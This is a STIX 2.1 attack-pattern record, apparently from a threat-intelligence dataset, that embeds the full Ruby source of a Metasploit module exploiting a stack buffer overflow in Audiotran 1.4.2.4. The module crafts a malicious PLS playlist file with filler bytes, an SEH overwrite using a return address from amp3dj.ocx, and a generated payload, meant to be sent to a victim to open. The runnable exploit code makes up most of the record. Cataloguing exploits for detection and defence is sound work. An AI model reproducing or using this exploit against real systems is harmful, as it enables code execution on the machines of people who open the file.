{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e1f3ce06-cee1-4503-8920-b590e44aa778",
    "created": "2024-08-14T16:38:20.560579Z",
    "modified": "2024-08-14T16:38:20.560583Z",
    "name": "Audiotran PLS File Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Audiotran 1.4.2.4. An attacker must send the file to victim and the victim must open the file. Alternatively, it may be possible to execute code remotely via an embedded PLS file within a browser when the PLS extension is registered to Audiotran. This alternate vector has not been tested and cannot be exercised directly with this module.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/audiotran_pls_1424.rb",
            "external_id": "audiotran_pls_1424.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Audiotran PLS File Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Audiotran 1.4.2.4.\n        An attacker must send the file to victim and the victim must open the file.\n        Alternatively, it may be possible to execute code remotely via an embedded\n        PLS file within a browser when the PLS extension is registered to Audiotran.\n        This alternate vector has not been tested and cannot be exercised directly\n        with this module.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t =>\n        [\n          'Philip OKeefe',\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '14961' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 5000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x3d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x1001cd67 } ], #p/p/r from amp3dj.ocx\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-09-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),\n        ])\n  end\n\n  def exploit\n    sploit = \"[playlist]\\r\\nFile1=\"\n    sploit << rand_text_alpha_upper(1940)\n    sploit << generate_seh_payload(target.ret)\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-09",
    "x_mitre_platforms": [
        "win'"
    ]
}